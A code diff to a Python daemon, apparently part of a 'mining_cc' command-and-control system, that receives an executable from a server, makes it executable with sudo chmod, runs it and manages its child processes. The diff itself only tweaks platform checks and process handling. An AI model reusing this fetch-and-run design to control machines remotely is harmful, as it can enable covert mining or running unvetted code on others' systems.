@@ -14,7 +14,7 @@ import psutil
 from mining_cc.shared.connection import connect_to_server
 from mining_cc.shared.ProtoHeader import *
 from mining_cc.shared.hashes import single_file_hash, dirhash
-from mining_cc.shared.utils import kill_process_and_children, logger, payload_to_dict
+from mining_cc.shared.utils import get_process_id_and_childen, kill_process_and_children, logger, payload_to_dict
 import threading
 
 os_system = platform.system().lower()
@@ -75,7 +75,8 @@ class Deamon:
             
             if self.client_process is not None:
                 logger(f"Shutting down client process: {self.client_process.pid}")
-                kill_process_and_children(self.client_process.pid)
+                kill_process_and_children(self.client_process.pid) 
+                time.sleep(0.1)
                 self.client_process = None
             SIZE = 1024
             BYTEORDER_LENGTH = 8
@@ -101,7 +102,8 @@ class Deamon:
 
             logger(f"[RECV] File data received.")
             logger(f"Granting access rights")
-            os.popen(f"sudo chmod u+x {path_to_client_exe}")
+            if os_system == "linux":
+                os.popen(f"sudo chmod u+x {path_to_client_exe}")
             self.client_socket.setblocking(False)
         except UnicodeDecodeError:
             self.client_socket.close()
@@ -124,8 +126,16 @@ class Deamon:
                     print(self.client_process, self.client_process.pid)
                     logger("exe started")
                 except PermissionError:
-                    os.popen(f"sudo chmod u+x {path_to_client_exe}")
+                    if os_system == "linux":
+                        os.popen(f"sudo chmod u+x {path_to_client_exe}")
                     self.start_check_client()
+            else:
+                pid_list = get_process_id_and_childen(self.client_process.pid)
+                if pid_list is None or len(get_process_id_and_childen(self.client_process.pid)) < 2:
+                    kill_process_and_children(self.client_process.pid)
+                    self.client_process = None
+                else:
+                    self.client_pid = get_process_id_and_childen(self.client_process.pid)[0]
             if self.client_process is not None and not psutil.pid_exists(self.client_process.pid):
                 self.client_process = None
         except FileNotFoundError:
